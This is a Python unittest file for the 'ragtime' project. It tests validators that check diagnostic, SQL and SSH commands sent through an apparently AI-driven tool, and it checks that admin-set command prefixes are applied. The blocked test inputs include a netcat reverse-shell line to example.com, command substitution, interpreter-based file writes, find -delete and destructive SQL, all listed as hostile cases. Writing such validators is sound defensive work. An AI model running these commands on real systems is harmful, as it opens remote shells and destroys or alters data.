import json
import unittest
from unittest import mock

from ragtime.core.security import validate_chat_diagnostic_command, validate_sql_query, validate_ssh_command


class ChatDiagnosticValidatorTests(unittest.TestCase):
    def _assert_blocked(self, command: str) -> None:
        safe, reason = validate_chat_diagnostic_command(command)
        self.assertFalse(safe, f"Expected {command!r} to be blocked; reason={reason}")

    def _assert_allowed(self, command: str) -> None:
        safe, reason = validate_chat_diagnostic_command(command)
        self.assertTrue(safe, f"Expected {command!r} to be allowed; reason={reason}")

    def test_rejects_backtick_command_substitution(self) -> None:
        self._assert_blocked("echo `id`")

    def test_rejects_dollar_paren_command_substitution(self) -> None:
        self._assert_blocked("echo $(id)")

    def test_rejects_awk_system_call(self) -> None:
        self._assert_blocked("awk 'BEGIN{system(\"id\")}'")

    def test_rejects_netcat_execution_flag(self) -> None:
        self._assert_blocked("nc -e /bin/sh example.com 4444")

    def test_rejects_find_delete(self) -> None:
        self._assert_blocked("find /tmp -delete")

    def test_rejects_find_exec(self) -> None:
        self._assert_blocked("find /tmp -exec cat {} +")

    def test_rejects_curl_output_file(self) -> None:
        self._assert_blocked("curl https://example.com/file -o /tmp/file")

    def test_rejects_wget_output_file(self) -> None:
        self._assert_blocked("wget https://example.com/file -O /tmp/file")

    def test_rejects_tar_extract(self) -> None:
        self._assert_blocked("tar xf archive.tar")

    def test_rejects_tar_create(self) -> None:
        self._assert_blocked("tar -cf out.tar .")

    def test_rejects_unzip_without_list(self) -> None:
        self._assert_blocked("unzip archive.zip")

    def test_allows_echo(self) -> None:
        self._assert_allowed("echo ok")

    def test_allows_find_readonly(self) -> None:
        self._assert_allowed("find /tmp -name '*.log'")

    def test_allows_curl_readonly(self) -> None:
        self._assert_allowed("curl https://example.com/health")

    def test_allows_tar_list(self) -> None:
        self._assert_allowed("tar -tf archive.tar")

    def test_allows_unzip_list(self) -> None:
        self._assert_allowed("unzip -l archive.zip")


class SqlReadOnlyValidatorTests(unittest.TestCase):
    def test_rejects_postgres_select_into_in_read_only_mode(self) -> None:
        safe, reason = validate_sql_query(
            "SELECT * INTO copied_users FROM users LIMIT 1",
            enable_write=False,
            require_limit_clause=True,
        )

        self.assertFalse(safe)
        self.assertIn("forbidden", reason.lower())

    def test_rejects_mssql_select_top_into_in_read_only_mode(self) -> None:
        safe, reason = validate_sql_query(
            "SELECT TOP 1 * INTO copied_users FROM users",
            enable_write=False,
            require_limit_clause=False,
        )

        self.assertFalse(safe)
        self.assertIn("forbidden", reason.lower())


class SshReadOnlyValidatorTests(unittest.TestCase):
    def test_rejects_python_interpreter_write_in_read_only_mode(self) -> None:
        safe, reason = validate_ssh_command(
            'python -c \'from pathlib import Path; Path("pwn").write_text("x")\'',
            allow_write=False,
        )

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_rejects_archive_extraction_without_absolute_destination(self) -> None:
        safe, reason = validate_ssh_command("tar -xf payload.tar", allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_rejects_traditional_tar_extraction_syntax(self) -> None:
        safe, reason = validate_ssh_command("tar xf payload.tar", allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_rejects_tar_archive_creation(self) -> None:
        safe, reason = validate_ssh_command("tar -cf out.tar .", allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_allows_tar_archive_listing(self) -> None:
        safe, reason = validate_ssh_command("tar -tf archive.tar", allow_write=False)

        self.assertTrue(safe, reason)

    def test_allows_traditional_tar_archive_listing(self) -> None:
        safe, reason = validate_ssh_command("tar tf archive.tar", allow_write=False)

        self.assertTrue(safe, reason)

    def test_allows_tar_archive_listing_with_change_directory(self) -> None:
        safe, reason = validate_ssh_command("tar -tf archive.tar -C /tmp", allow_write=False)

        self.assertTrue(safe, reason)

    def test_allows_tar_archive_listing_with_exclude_file(self) -> None:
        safe, reason = validate_ssh_command("tar -tf archive.tar -X excludes.txt", allow_write=False)

        self.assertTrue(safe, reason)

    def test_rejects_tar_append_update_and_delete_modes(self) -> None:
        commands = [
            "tar -rf archive.tar new-file",
            "tar -uf archive.tar changed-file",
            "tar --delete -f archive.tar old-file",
            "tar --get -f archive.tar file",
        ]
        for command in commands:
            with self.subTest(command=command):
                safe, reason = validate_ssh_command(command, allow_write=False)
                self.assertFalse(safe)
                self.assertIn("write", reason.lower())

    def test_rejects_relative_redirect_write_in_read_only_mode(self) -> None:
        safe, reason = validate_ssh_command("printf x > pwned.txt", allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_rejects_bash_combined_redirect_write(self) -> None:
        safe, reason = validate_ssh_command("printf x >& pwned.txt", allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_allows_file_descriptor_redirect_to_stderr(self) -> None:
        safe, reason = validate_ssh_command("ls missing >&2", allow_write=False)

        self.assertTrue(safe, reason)

    def test_allows_file_descriptor_duplication(self) -> None:
        safe, reason = validate_ssh_command("ls missing 2>&1", allow_write=False)

        self.assertTrue(safe, reason)

    def test_allows_append_to_dev_null(self) -> None:
        safe, reason = validate_ssh_command("tail access.log >> /dev/null", allow_write=False)

        self.assertTrue(safe, reason)

    def test_rejects_node_eval_in_read_only_mode(self) -> None:
        safe, reason = validate_ssh_command('node -e \'require("fs").writeFileSync("pwn", "x")\'', allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_rejects_php_eval_in_read_only_mode(self) -> None:
        safe, reason = validate_ssh_command('php -r \'file_put_contents("pwn", "x");\'', allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_rejects_shell_command_eval_in_read_only_mode(self) -> None:
        safe, reason = validate_ssh_command("bash -lc 'printf x > pwned.txt'", allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_allows_grep_matching_delete_from_literal(self) -> None:
        safe, reason = validate_ssh_command("grep 'DELETE FROM' app.log", allow_write=False)

        self.assertTrue(safe, reason)

    def test_allows_truncate_help(self) -> None:
        safe, reason = validate_ssh_command("truncate --help", allow_write=False)

        self.assertTrue(safe, reason)

    def test_rejects_psql_c_write(self) -> None:
        safe, reason = validate_ssh_command('psql -c "DELETE FROM users"', allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())

    def test_rejects_mysql_e_write(self) -> None:
        safe, reason = validate_ssh_command("mysql -e \"UPDATE users SET name='x'\"", allow_write=False)

        self.assertFalse(safe)
        self.assertIn("write", reason.lower())


class SshToolCommandPrefixTests(unittest.IsolatedAsyncioTestCase):
    async def test_allows_admin_configured_shell_wrapper_prefix(self) -> None:
        from ragtime.core.ssh import SSHResult
        from ragtime.rag.components import RAGComponents

        config = {
            "name": "Test SSH",
            "allow_write": False,
            "connection_config": {
                "host": "example.invalid",
                "user": "alice",
                "command_prefix": "sudo -u appuser bash -lc ",
            },
        }
        tool = await RAGComponents()._create_ssh_tool(config, "test", "tool-1")

        with mock.patch(
            "ragtime.rag.components.execute_ssh_command",
            return_value=SSHResult(success=True, stdout="ok", stderr="", exit_code=0),
        ) as execute:
            coroutine = tool.coroutine
            assert coroutine is not None
            result = await coroutine(command="ls", reason="test")

        payload = json.loads(result)
        self.assertEqual(payload["status"], "completed")
        self.assertEqual(payload["stdout"], "ok")
        self.assertEqual(execute.call_args.args[1], "sudo -u appuser bash -lc ls")

    async def test_allows_admin_configured_environment_setup_prefix(self) -> None:
        from ragtime.core.ssh import SSHResult
        from ragtime.rag.components import RAGComponents

        config = {
            "name": "Test SSH",
            "allow_write": False,
            "connection_config": {
                "host": "example.invalid",
                "user": "alice",
                "command_prefix": "cd /app && source venv/bin/activate && ",
            },
        }
        tool = await RAGComponents()._create_ssh_tool(config, "test", "tool-1")

        with mock.patch(
            "ragtime.rag.components.execute_ssh_command",
            return_value=SSHResult(success=True, stdout="ok", stderr="", exit_code=0),
        ) as execute:
            coroutine = tool.coroutine
            assert coroutine is not None
            result = await coroutine(command="python --version", reason="test")

        payload = json.loads(result)
        self.assertEqual(payload["status"], "completed")
        self.assertEqual(payload["stdout"], "ok")
        self.assertEqual(
            execute.call_args.args[1],
            "cd /app && source venv/bin/activate && python --version",
        )

    async def test_rejects_mutating_user_command_even_with_setup_prefix(self) -> None:
        from ragtime.rag.components import RAGComponents

        config = {
            "name": "Test SSH",
            "allow_write": False,
            "connection_config": {
                "host": "example.invalid",
                "user": "alice",
                "command_prefix": "cd /app && ",
            },
        }
        tool = await RAGComponents()._create_ssh_tool(config, "test", "tool-1")

        with mock.patch("ragtime.rag.components.execute_ssh_command", side_effect=AssertionError("SSH should not execute")):
            coroutine = tool.coroutine
            assert coroutine is not None
            result = await coroutine(command="printf x > pwned.txt", reason="test")

        payload = json.loads(result)
        self.assertEqual(payload["status"], "rejected")
        self.assertIn("write", payload["error"].lower())


if __name__ == "__main__":
    unittest.main()
